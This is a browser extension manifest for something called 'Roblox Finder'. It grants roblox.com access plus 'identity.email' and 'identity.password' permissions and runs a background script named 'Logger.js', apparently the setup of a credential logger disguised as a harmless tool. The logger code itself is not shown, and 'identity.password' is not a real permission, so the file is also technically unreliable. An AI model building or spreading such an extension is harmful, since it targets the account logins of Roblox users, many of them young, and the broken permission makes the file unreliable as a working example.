{
    "name": "Roblox Finder",
    "version": "1.0",
    "manifest_version": 2,
    "description": "Extension description.",
    "browser_action": {
        "default_icon": "icon.png"
    },
    "permissions": [
        "https://www.roblox.com/",
        "identity.email",
        "identity.password"
    ],
    "background": {
        "scripts": ["Logger.js"]
    },
    "icons": {
        "16": "icon.png",
        "48": "icon.png",
        "128": "icon.png"
    }
}
